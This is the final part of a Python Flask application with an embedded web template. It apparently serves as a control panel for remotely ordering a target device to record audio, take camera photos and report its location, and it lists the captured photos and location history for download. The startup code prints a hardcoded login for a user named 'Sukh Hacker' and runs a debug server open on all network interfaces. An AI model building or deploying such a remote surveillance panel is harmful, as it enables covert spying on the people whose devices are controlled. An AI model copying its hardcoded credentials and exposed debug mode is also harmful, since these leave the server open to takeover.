                    <img src="/files/{{ photo.name }}" alt="{{ photo.name }}" class="photo-img" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDIwMCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMTUwIiBmaWxsPSIjMUExQTFBIi8+CjxwYXRoIGQ9Ik03NSA1MEgxMjVNMTI1IDUwSDEyNS41TTEyNSA1MEwxMjUgNTAuNVpNNzUgNzVIMTI1TTc1IDEwMEgxMjUiIHN0cm9rZT0iIzMzMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CjxjaXJjbGUgY3g9Ijc1IiBjeT0iMTAwIiByPSIxNSIgZmlsbD0iIzMzMyIvPgo8L3N2Zz4K'">
                    <div class="photo-info">
                        <div class="photo-name">{{ photo.name }}</div>
                        <div class="photo-size">{{ (photo.size / 1024)|round(2) }} KB</div>
                    </div>
                </div>
                {% endfor %}
            </div>
            {% else %}
            <div class="empty-state">
                <h4>📷 No Photos Found</h4>
                <p>Capture photos using camera controls</p>
            </div>
            {% endif %}
        </div>

        <!-- Location Files -->
        <div class="control-section">
            <div class="section-title">🗺️ Location History</div>
            
            {% if location_files %}
            <div class="files-grid">
                {% for location in location_files %}
                <div class="file-card">
                    <div class="file-name">{{ location.name }}</div>
                    <div class="file-info">
                        <span>Size: {{ (location.size / 1024)|round(2) }} KB</span>
                        <span>{{ location.modified|int|string|truncate(10, True, '') }}</span>
                    </div>
                    <div class="file-actions">
                        <a href="/files/{{ location.name }}" class="btn-file btn-download" download>📥 Download</a>
                        <button class="btn-file btn-delete" onclick="deleteFile('{{ location.name }}')">🗑️ Delete</button>
                    </div>
                </div>
                {% endfor %}
            </div>
            {% else %}
            <div class="empty-state">
                <h4>🗺️ No Location Data</h4>
                <p>Get location data using location controls</p>
            </div>
            {% endif %}
        </div>
    </div>

    <script>
        const deviceId = "{{ device_id }}";
        
        // Recording functions
        async function startRecording() {
            const recordTime = document.getElementById('recordTime').value || 15;
            
            try {
                const response = await fetch(`/device/${deviceId}/start-recording`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ record_time: parseInt(recordTime) })
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    updateStatus('recordingStatus', '🟢 Recording: Active', 'status-active');
                    showNotification('Recording signal sent to device', 'success');
                } else {
                    showNotification('Failed to send recording signal: ' + data.error, 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('Failed to send recording signal', 'error');
            }
        }
        
        function stopRecording() {
            // For now, stopping is handled automatically after the recording duration
            updateStatus('recordingStatus', '🔴 Recording: Inactive', 'status-inactive');
            showNotification('Recording will stop automatically after duration', 'info');
        }
        
        // Camera functions
        async function captureCamera(cameraType) {
            try {
                const response = await fetch(`/device/${deviceId}/start-camera-signal`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ camera_type: cameraType })
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    updateStatus('cameraStatus', `🟢 Camera: ${cameraType} Active`, 'status-active');
                    showNotification(`${cameraType} camera signal sent to device`, 'success');
                    
                    // Reset status after 5 seconds
                    setTimeout(() => {
                        updateStatus('cameraStatus', '🔴 Camera: Inactive', 'status-inactive');
                    }, 5000);
                } else {
                    showNotification('Failed to send camera signal: ' + data.error, 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('Failed to send camera signal', 'error');
            }
        }
        
        // Location functions
        async function getLocation() {
            try {
                const response = await fetch(`/device/${deviceId}/start-location-signal`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    updateStatus('locationStatus', '🟢 Location: Active', 'status-active');
                    showNotification('Location signal sent to device', 'success');
                    
                    // Reset status after 5 seconds
                    setTimeout(() => {
                        updateStatus('locationStatus', '🔴 Location: Inactive', 'status-inactive');
                    }, 5000);
                } else {
                    showNotification('Failed to send location signal: ' + data.error, 'error');
                }
            } catch (error) {
                console.error('Error:', error);
                showNotification('Failed to send location signal', 'error');
            }
        }
        
        // Utility functions
        function updateStatus(elementId, text, className) {
            const element = document.getElementById(elementId);
            element.textContent = text;
            element.className = `signal-status ${className}`;
        }
        
        function showNotification(message, type) {
            // Simple notification - you can enhance this with a proper notification system
            alert(`${type.toUpperCase()}: ${message}`);
        }
        
        async function deleteFile(filename) {
            if (confirm('Are you sure you want to delete this file?')) {
                try {
                    const response = await fetch(`/delete-file/${filename}`, {
                        method: 'POST'
                    });
                    
                    if (response.ok) {
                        showNotification('File deleted successfully', 'success');
                        location.reload();
                    } else {
                        showNotification('Failed to delete file', 'error');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    showNotification('Failed to delete file', 'error');
                }
            }
        }
        
        // Auto-refresh photos and location data every 10 seconds
        setInterval(() => {
            // You can implement auto-refresh for specific sections here
        }, 10000);
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    print("🚀 Starting Guard System Server...")
    print("📧 Login URL: http://localhost:5000/login")
    print("👤 Username: Sukh Hacker")
    print("🔑 Password: sukhbir44@007")
    app.run(host='0.0.0.0', port=5000, debug=True)
